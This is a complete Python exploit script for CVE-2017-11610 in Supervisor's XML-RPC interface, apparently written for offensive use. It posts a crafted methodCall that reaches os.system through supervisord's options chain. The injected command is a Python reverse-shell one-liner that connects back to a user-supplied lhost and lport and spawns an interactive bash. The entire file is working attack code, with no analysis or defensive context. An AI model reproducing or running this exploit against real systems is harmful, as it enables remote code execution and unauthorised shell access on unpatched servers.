# -*- coding: utf-8 -*-
# author: seven
import argparse
import requests

def getshell(url,lhost,lport):
    reverse_cmd = '''python -c "import os,socket,subprocess;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{}',{}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash','-i']);"
    '''.format(lhost,lport)
    post_data = '''<?xml version="1.0"?>
<methodCall>
<methodName>supervisor.supervisord.options.warnings.linecache.os.system</methodName>
<params>
<param>
<string>{}</string>
</param>
</params>
</methodCall>'''.format(reverse_cmd)
    try:
        res = requests.post(url,data=post_data,timeout=3)
        print(res.text)
    except Exception as e:
        print(str(e))
        print('check reverse shell at {}:{}'.format(lhost,lport))


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="used for CVE-2017-11610 reverse shell")
    parser.add_argument("url",help="target url with rpc.example:http://127.0.0.1/RPC2")
    parser.add_argument("--lhost",required=True)
    parser.add_argument("--lport",required=True)
    args = parser.parse_args()
    getshell(args.url,args.lhost,args.lport)